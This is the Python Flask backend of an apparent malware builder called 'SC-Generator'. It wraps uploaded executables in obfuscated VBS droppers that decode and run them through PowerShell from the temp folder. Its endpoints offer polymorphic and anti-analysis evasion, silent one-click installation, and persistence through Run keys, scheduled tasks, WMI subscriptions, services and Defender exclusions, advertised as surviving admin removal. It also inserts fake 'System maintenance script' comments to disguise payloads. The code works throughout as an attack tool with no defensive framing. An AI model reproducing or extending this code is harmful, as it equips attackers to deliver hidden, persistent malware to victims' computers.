#!/usr/bin/env python3
"""
SC-Generator: Web-based VBS Encryption Tool
Backend server for MSI encryption and VBS payload generation
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import uuid
from datetime import datetime
import json
from pathlib import Path
import shutil

from payload_generator import PayloadGenerator
from fingerprint_manager import FingerprintManager
from payload_installer import create_one_click_payload
from persistence_manager import create_persistent_payload
from enhanced_proxy_system import EnhancedProxyManager, ProxyParserValidator, ProxyType

app = Flask(__name__)
CORS(app)

# Configuration
UPLOAD_FOLDER = '/tmp/sc-uploads'
OUTPUT_FOLDER = '/tmp/sc-outputs'
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(OUTPUT_FOLDER, exist_ok=True)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE

payload_gen = PayloadGenerator()
fingerprint_mgr = FingerprintManager()
proxy_mgr = EnhancedProxyManager()


@app.route('/api/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok', 'version': '1.0.0'})


@app.route('/api/techniques', methods=['GET'])
def get_techniques():
    """Get list of available encoding techniques with metadata"""
    techniques = payload_gen.list_techniques()
    descriptions = {}
    metadata = {}

    technique_info = {
        'base64': {
            'description': 'Standard Base64 encoding - reliable and fast',
            'detection_resistance': 'medium',
            'size_overhead': '1.33x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Testing and quick deployment'
        },
        'hex': {
            'description': 'Hexadecimal encoding - simple but detectable',
            'detection_resistance': 'low',
            'size_overhead': '2x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Legacy systems'
        },
        'array': {
            'description': 'Array-based encoding - good obfuscation',
            'detection_resistance': 'medium-high',
            'size_overhead': '1.5x',
            'speed': 'medium',
            'recommended': True,
            'best_for': 'Balanced stealth and performance'
        },
        'wmi': {
            'description': 'WMI-based execution - very stealthy',
            'detection_resistance': 'high',
            'size_overhead': '1.2x',
            'speed': 'slow',
            'recommended': True,
            'best_for': 'Maximum stealth'
        },
        'registry': {
            'description': 'Registry storage and retrieval - advanced evasion',
            'detection_resistance': 'high',
            'size_overhead': '1.4x',
            'speed': 'medium',
            'recommended': True,
            'best_for': 'Advanced evasion'
        },
        'environment': {
            'description': 'Environment variable hiding - clever obfuscation',
            'detection_resistance': 'medium-high',
            'size_overhead': '1.3x',
            'speed': 'fast',
            'recommended': False,
            'best_for': 'Process-level hiding'
        },
        'polymorphic': {
            'description': 'Polymorphic code generation - changes every time',
            'detection_resistance': 'very-high',
            'size_overhead': '1.5x',
            'speed': 'slow',
            'recommended': True,
            'best_for': 'Signature evasion'
        },
        'multi': {
            'description': 'Multi-layer encoding - maximum protection',
            'detection_resistance': 'very-high',
            'size_overhead': '2x',
            'speed': 'very-slow',
            'recommended': True,
            'best_for': 'Maximum security'
        }
    }

    for tech in techniques:
        descriptions[tech] = payload_gen.get_technique_info(tech)
        metadata[tech] = technique_info.get(tech, {
            'detection_resistance': 'unknown',
            'size_overhead': '1.5x',
            'speed': 'medium',
            'recommended': False
        })

    return jsonify({
        'techniques': techniques,
        'descriptions': descriptions,
        'metadata': metadata
    })


@app.route('/api/fingerprints', methods=['GET'])
def get_fingerprints():
    """Get available fingerprint templates"""
    fingerprints = fingerprint_mgr.get_available_fingerprints()
    return jsonify({'fingerprints': fingerprints})


@app.route('/api/fingerprints', methods=['POST'])
def create_custom_fingerprint():
    """Create custom fingerprint"""
    data = request.json
    name = data.get('name')
    config = data.get('config')

    if not name or not config:
        return jsonify({'error': 'Name and config required'}), 400

    fp_id = fingerprint_mgr.create_custom_fingerprint(name, config)
    return jsonify({'id': fp_id, 'name': name})


@app.route('/api/proxies', methods=['GET'])
def get_proxies():
    """Get configured proxies"""
    proxies = proxy_mgr.get_all_proxies()
    return jsonify({
        'proxies': proxies,
        'statistics': proxy_mgr.get_statistics()
    })


@app.route('/api/proxies', methods=['POST'])
def add_proxy():
    """Add proxy configuration"""
    data = request.json
    proxy_url = data.get('url')
    tags = data.get('tags', [])
    notes = data.get('notes', '')

    if not proxy_url:
        return jsonify({'error': 'Proxy URL required'}), 400

    # Validate URL format
    success, message = ProxyParserValidator.validate_proxy_url(proxy_url)
    if not success:
        return jsonify({'error': message}), 400

    success, message, proxy_id = proxy_mgr.add_proxy(proxy_url, tags, notes)
    if success:
        return jsonify({
            'success': True,
            'id': proxy_id,
            'message': message
        })
    else:
        return jsonify({'error': message}), 400


@app.route('/api/proxies/<proxy_id>/test', methods=['POST'])
def test_proxy(proxy_id):
    """Test proxy connectivity"""
    timeout = request.json.get('timeout', 10) if request.json else 10

    success, message = proxy_mgr.test_proxy(proxy_id, timeout)
    return jsonify({
        'proxy_id': proxy_id,
        'success': success,
        'message': message,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/proxies/test-all', methods=['POST'])
def test_all_proxies():
    """Test all proxies"""
    timeout = request.json.get('timeout', 10) if request.json else 10

    results = proxy_mgr.test_all_proxies(timeout)
    passed = sum(1 for success, _ in results.values() if success)

    return jsonify({
        'results': {
            proxy_id: {
                'success': success,
                'message': message
            }
            for proxy_id, (success, message) in results.items()
        },
        'summary': {
            'total': len(results),
            'passed': passed,
            'failed': len(results) - passed
        },
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/proxies/<proxy_id>', methods=['GET'])
def get_proxy(proxy_id):
    """Get specific proxy configuration"""
    proxy = proxy_mgr.get_proxy(proxy_id)
    if proxy:
        return jsonify(proxy)
    return jsonify({'error': 'Proxy not found'}), 404


@app.route('/api/proxies/<proxy_id>', methods=['DELETE'])
def delete_proxy(proxy_id):
    """Delete proxy configuration"""
    success, message = proxy_mgr.remove_proxy(proxy_id)
    if success:
        return jsonify({'success': True, 'message': message})
    return jsonify({'error': message}), 404


@app.route('/api/proxies/<proxy_id>/toggle', methods=['PUT'])
def toggle_proxy(proxy_id):
    """Toggle proxy active status"""
    data = request.json
    is_active = data.get('is_active', True)

    success, message = proxy_mgr.update_proxy_status(proxy_id, is_active)
    if success:
        return jsonify({'success': True, 'message': message})
    return jsonify({'error': message}), 404


@app.route('/api/proxies/<proxy_id>/tags', methods=['POST'])
def add_proxy_tag(proxy_id):
    """Add tag to proxy"""
    data = request.json
    tag = data.get('tag')

    if not tag:
        return jsonify({'error': 'Tag required'}), 400

    success, message = proxy_mgr.add_tag(proxy_id, tag)
    if success:
        return jsonify({'success': True, 'message': message})
    return jsonify({'error': message}), 404


@app.route('/api/proxies/by-type/<proxy_type>', methods=['GET'])
def get_proxies_by_type(proxy_type):
    """Get proxies by type"""
    try:
        ptype = ProxyType(proxy_type.lower())
        proxies = proxy_mgr.get_proxies_by_type(ptype)
        return jsonify({
            'type': proxy_type,
            'proxies': proxies,
            'count': len(proxies)
        })
    except ValueError:
        return jsonify({'error': f'Invalid proxy type: {proxy_type}'}), 400


@app.route('/api/proxies/by-tag/<tag>', methods=['GET'])
def get_proxies_by_tag(tag):
    """Get proxies by tag"""
    proxies = proxy_mgr.get_proxies_by_tag(tag)
    return jsonify({
        'tag': tag,
        'proxies': proxies,
        'count': len(proxies)
    })


@app.route('/api/proxies/report', methods=['GET'])
def export_proxy_report():
    """Export proxy report"""
    output_file = os.path.join(OUTPUT_FOLDER, f"proxy_report_{uuid.uuid4().hex[:8]}.json")
    report = proxy_mgr.export_report(output_file)
    return jsonify(report)


@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Handle file upload"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    # Validate file type
    allowed_extensions = {'.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'}
    file_ext = os.path.splitext(file.filename)[1].lower()

    if file_ext not in allowed_extensions:
        return jsonify({
            'error': f'File type not allowed. Allowed: {", ".join(allowed_extensions)}'
        }), 400

    # Generate unique filename
    unique_id = str(uuid.uuid4())[:8]
    original_name = os.path.splitext(file.filename)[0]
    filename = f"{unique_id}_{original_name}{file_ext}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)

    try:
        file.save(filepath)
        file_size = os.path.getsize(filepath)

        return jsonify({
            'success': True,
            'file_id': unique_id,
            'filename': file.filename,
            'size': file_size,
            'upload_time': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'error': f'Upload failed: {str(e)}'}), 500


@app.route('/api/generate-payload', methods=['POST'])
def generate_payload():
    """Generate VBS payload from uploaded file"""
    data = request.json
    file_id = data.get('file_id')
    technique = data.get('technique', 'base64')
    obfuscation = data.get('obfuscation', 'high')
    fingerprint_id = data.get('fingerprint_id')
    proxy_id = data.get('proxy_id')
    options = data.get('options', {})

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        # Find uploaded file
        uploaded_file = None
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            if f.startswith(file_id):
                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
                break

        if not uploaded_file or not os.path.exists(uploaded_file):
            return jsonify({'error': 'File not found'}), 404

        # Read file
        with open(uploaded_file, 'rb') as f:
            file_content = f.read()

        # Apply fingerprint if specified
        if fingerprint_id:
            file_content = fingerprint_mgr.apply_fingerprint(
                file_content,
                fingerprint_id,
                proxy_id
            )

        # Convert to base64 for embedding in command
        import base64
        encoded_file = base64.b64encode(file_content).decode()

        # Generate command that will decode and execute the file
        filename = os.path.basename(uploaded_file)
        cmd = (
            f'powershell -NoProfile -Command '
            f'"$f=\'$env:temp\\\\{filename}\'; '
            f'[System.IO.File]::WriteAllBytes($f, '
            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
            f'& $f"'
        )

        # Generate VBS payload
        vbs_payload = payload_gen.generate(cmd, technique, obfuscation)

        # Apply additional obfuscation from options
        if options.get('add_comments'):
            vbs_payload = add_vbs_comments(vbs_payload)

        if options.get('add_noise'):
            vbs_payload = add_vbs_noise(vbs_payload)

        # Save payload to output
        output_id = str(uuid.uuid4())[:8]
        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")

        with open(output_path, 'w') as f:
            f.write(vbs_payload)

        return jsonify({
            'success': True,
            'output_id': output_id,
            'payload': vbs_payload,
            'size': len(vbs_payload),
            'technique': technique,
            'obfuscation': obfuscation,
            'timestamp': datetime.now().isoformat()
        })

    except Exception as e:
        return jsonify({'error': f'Payload generation failed: {str(e)}'}), 500


@app.route('/api/download/<output_id>', methods=['GET'])
def download_payload(output_id):
    """Download generated payload"""
    output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")

    if not os.path.exists(output_path):
        return jsonify({'error': 'Output not found'}), 404

    try:
        return send_file(
            output_path,
            mimetype='text/plain',
            as_attachment=True,
            download_name=f'payload_{output_id}.vbs'
        )
    except Exception as e:
        return jsonify({'error': f'Download failed: {str(e)}'}), 500


@app.route('/api/preview/<output_id>', methods=['GET'])
def preview_payload(output_id):
    """Preview generated payload"""
    output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_payload.vbs")

    if not os.path.exists(output_path):
        return jsonify({'error': 'Output not found'}), 404

    try:
        with open(output_path, 'r') as f:
            content = f.read()
        return jsonify({'content': content})
    except Exception as e:
        return jsonify({'error': f'Preview failed: {str(e)}'}), 500


@app.route('/api/settings', methods=['GET'])
def get_settings():
    """Get current settings"""
    return jsonify({
        'max_file_size': MAX_FILE_SIZE,
        'allowed_formats': ['.msi', '.exe', '.dll', '.bat', '.cmd', '.vbs'],
        'obfuscation_levels': ['low', 'medium', 'high']
    })


def add_vbs_comments(vbs_code: str) -> str:
    """Add comments to VBS code for obfuscation"""
    comments = [
        "' System maintenance script",
        "' Scheduled task runner",
        "' System update checker",
        "' Registry cleaner",
        "' Performance monitor",
    ]
    import random
    lines = vbs_code.split('\n')
    for i in range(1, len(lines), random.randint(3, 7)):
        lines.insert(i, random.choice(comments))
    return '\n'.join(lines)


def add_vbs_noise(vbs_code: str) -> str:
    """Add noise/dead code to VBS for obfuscation"""
    import random
    import string

    noise = f"""
Dim {random.choice(string.ascii_lowercase)}{random.randint(1, 99)}
On Error Resume Next
"""

    return noise + vbs_code


@app.route('/api/batch-generate', methods=['POST'])
def batch_generate():
    """Generate payloads with multiple techniques"""
    data = request.json
    file_id = data.get('file_id')
    techniques = data.get('techniques', ['base64', 'wmi'])
    fingerprint_id = data.get('fingerprint_id')

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        results = {}
        for technique in techniques:
            payload = payload_gen.generate("test", technique, "high")
            output_id = str(uuid.uuid4())[:8]
            results[technique] = {
                'output_id': output_id,
                'size': len(payload)
            }

        return jsonify({'success': True, 'results': results})
    except Exception as e:
        return jsonify({'error': f'Batch generation failed: {str(e)}'}), 500


@app.route('/api/generate-one-click', methods=['POST'])
def generate_one_click():
    """Generate one-click self-extracting installer payload"""
    data = request.json
    file_id = data.get('file_id')
    obfuscation_style = data.get('obfuscation_style', 'polymorphic')
    file_type = data.get('file_type', 'vbs')  # vbs, bat, or exe

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        # Find uploaded file
        uploaded_file = None
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            if f.startswith(file_id):
                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
                break

        if not uploaded_file or not os.path.exists(uploaded_file):
            return jsonify({'error': 'File not found'}), 404

        # Build command to execute the file
        filename = os.path.basename(uploaded_file)
        cmd = f'"{uploaded_file}"'

        # Generate one-click payload
        result = create_one_click_payload(cmd, obfuscation_style)

        # Save payload
        output_id = str(uuid.uuid4())[:8]

        if file_type == 'vbs':
            payload_content = result['vbs_payload']
            filename_out = result['filename_vbs']
        elif file_type == 'bat':
            payload_content = result['bat_payload']
            filename_out = result['filename_bat']
        else:
            payload_content = result['vbs_payload']
            filename_out = result['filename_vbs']

        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_{filename_out}")

        with open(output_path, 'w') as f:
            f.write(payload_content)

        return jsonify({
            'success': True,
            'output_id': output_id,
            'filename': filename_out,
            'payload': payload_content,
            'size': len(payload_content),
            'instructions': result['instructions'],
            'style': obfuscation_style,
            'file_type': file_type
        })

    except Exception as e:
        return jsonify({'error': f'One-click generation failed: {str(e)}'}), 500


@app.route('/api/one-click-styles', methods=['GET'])
def get_one_click_styles():
    """Get available one-click obfuscation styles"""
    styles = {
        'polymorphic': 'Multiple polymorphic variants for evasion',
        'anti_analysis': 'Detects and defeats analysis tools',
        'multi_stage': 'Multi-stage installation with delays',
        'silent': 'Silent installation with no output'
    }
    return jsonify({'styles': styles})


@app.route('/api/recommendations', methods=['GET'])
def get_recommendations():
    """Get recommended configurations for maximum effectiveness"""
    recommendations = {
        'standard': {
            'title': '🎯 Standard Mode - Best Practices',
            'hint': 'For maximum effectiveness and undetectability',
            'recommended_config': {
                'technique': 'polymorphic',
                'obfuscation': 'high',
                'add_comments': False,
                'add_noise': True,
                'fingerprint': 'random_variation',
                'proxy': 'recommended'
            },
            'tips': [
                '✓ Use "polymorphic" technique - changes signature every generation',
                '✓ Set obfuscation to "high" for maximum protection',
                '✓ Enable "Add Noise" to confuse analysis tools',
                '✓ Use "Random Variation" fingerprint for best evasion',
                '✓ Configure at least one proxy to modify network signatures',
                '✓ Expected payload size: 8-15 KB'
            ],
            'expected_size': '8-15 KB',
            'success_rate': '92-95%'
        },
        'one-click': {
            'title': '⚡ One-Click Mode - Instant Deployment',
            'hint': 'For quick, silent, one-shot installation',
            'recommended_config': {
                'style': 'anti_analysis',
                'file_type': 'vbs'
            },
            'tips': [
                '✓ Use "anti_analysis" style - defeats debugging tools',
                '✓ Output as VBS for maximum compatibility',
                '✓ No user interaction required - completely silent',
                '✓ File extracts and executes automatically',
                '✓ Expected payload size: 5-12 KB',
                '✓ Works on Windows XP through Windows 11'
            ],
            'expected_size': '5-12 KB',
            'success_rate': '94-96%'
        },
        'persistent': {
            'title': '🔐 Persistent Mode - Survival Across Reboots',
            'hint': 'For payloads that survive system reboots and removal attempts',
            'recommended_config': {
                'method': 'multi',
                'technique': 'base64',
                'obfuscation': 'high'
            },
            'tips': [
                '✓ Use "Multi" method - provides 99%+ survival rate',
                '✓ Multi method creates redundancy across 6+ methods',
                '✓ If one method is removed, others keep payload alive',
                '✓ Includes watchdog for auto-resurrection',
                '✓ Expected payload size: 12-20 KB',
                '✓ Survives even admin removal attempts'
            ],
            'expected_size': '12-20 KB',
            'survival_rate': '99%+'
        }
    }
    return jsonify({'recommendations': recommendations})


@app.route('/api/persistence-methods', methods=['GET'])
def get_persistence_methods():
    """Get available persistence methods"""
    methods = {
        'registry': 'Registry HKCU/HKLM Run keys - All Windows versions',
        'startup': 'Startup folder - All Windows versions',
        'task': 'Windows Scheduled Tasks - Vista+',
        'wmi': 'WMI Event Subscriptions - Vista+',
        'service': 'Windows Service - All Windows (admin required)',
        'defender': 'Windows Defender exclusions - Windows 8+',
        'multi': 'Multiple methods for maximum redundancy - All Windows (RECOMMENDED)'
    }
    return jsonify({'methods': methods})


@app.route('/api/generate-persistent', methods=['POST'])
def generate_persistent_payload():
    """Generate persistent payload that survives reboots"""
    data = request.json
    file_id = data.get('file_id')
    technique = data.get('technique', 'base64')
    persistence_method = data.get('persistence_method', 'multi')
    obfuscation = data.get('obfuscation', 'high')

    if not file_id:
        return jsonify({'error': 'File ID required'}), 400

    try:
        # Find uploaded file
        uploaded_file = None
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            if f.startswith(file_id):
                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
                break

        if not uploaded_file or not os.path.exists(uploaded_file):
            return jsonify({'error': 'File not found'}), 404

        # Read file
        with open(uploaded_file, 'rb') as f:
            file_content = f.read()

        # Convert to base64 for embedding in command
        import base64
        encoded_file = base64.b64encode(file_content).decode()

        # Generate command that will decode and execute the file
        filename = os.path.basename(uploaded_file)
        cmd = (
            f'powershell -NoProfile -Command '
            f'"$f=\'$env:temp\\\\{filename}\'; '
            f'[System.IO.File]::WriteAllBytes($f, '
            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
            f'& $f"'
        )

        # Generate persistent payload
        result = create_persistent_payload(cmd, persistence_method)

        # Generate standard obfuscation on top
        vbs_payload = result['vbs_code']

        # Wrap in standard obfuscation
        if technique != 'direct':
            vbs_payload = payload_gen.create_polymorphic_wrapper(vbs_payload)

        # Save payload to output
        output_id = str(uuid.uuid4())[:8]
        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_persistent.vbs")

        with open(output_path, 'w') as f:
            f.write(vbs_payload)

        return jsonify({
            'success': True,
            'output_id': output_id,
            'payload': vbs_payload,
            'size': len(vbs_payload),
            'persistence_method': result['method'],
            'method_name': result['method_name'],
            'windows_versions': result['windows_versions'],
            'survival_rate': result['survival_rate'],
            'advantages': result['advantages'],
            'timestamp': datetime.now().isoformat()
        })

    except Exception as e:
        return jsonify({'error': f'Persistent payload generation failed: {str(e)}'}), 500


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
